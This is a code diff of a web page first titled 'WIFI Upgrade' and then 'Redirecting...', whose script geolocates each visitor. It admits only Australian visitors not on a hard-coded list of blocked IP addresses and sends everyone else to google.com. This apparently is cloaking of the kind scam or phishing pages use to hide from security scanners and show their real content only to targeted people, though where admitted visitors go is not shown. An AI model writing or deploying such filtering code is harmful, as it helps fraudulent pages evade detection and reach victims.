@@ -3,10 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>WIFI Upgrade</title>
+  <title>Redirecting...</title>
   <script>
     const allowedCountry = 'AU';
-
     const blockedIPs = [
       "185.18.222.147", "103.17.196.155", "198.44.133.53", "138.199.22.183", "106.161.65.206",
       "54.200.5.221", "35.89.14.236", "104.210.79.75", "35.88.70.185", "96.0.0.81",
@@ -22,19 +21,11 @@
 
     async function checkAccess() {
       try {
-        // 1. نجيبو الدولة من API سريع
-        const countryRes = await fetch("https://ipapi.co/json/");
-        const countryData = await countryRes.json();
-        const country = countryData.country;
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+        const country = data.country;
+        const ip = data.ip;
 
-        // 2. نجيبو IP من service آخر
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-        const ip = ipData.ip;
-
-        console.log("IP:", ip, "Country:", country);
-
-        // 3. نشوفو واش IP محضور
         const isBlocked = blockedIPs.some(blocked => {
           return blocked.endsWith('.') ? ip.startsWith(blocked) : ip === blocked;
         });
@@ -44,9 +35,8 @@
         } else {
           window.location.href = "https://google.com";
         }
-
-      } catch (err) {
-        console.error("Error checking access:", err);
+      } catch (error) {
+        console.error("Error during redirection:", error);
         window.location.href = "https://google.com";
       }
     }
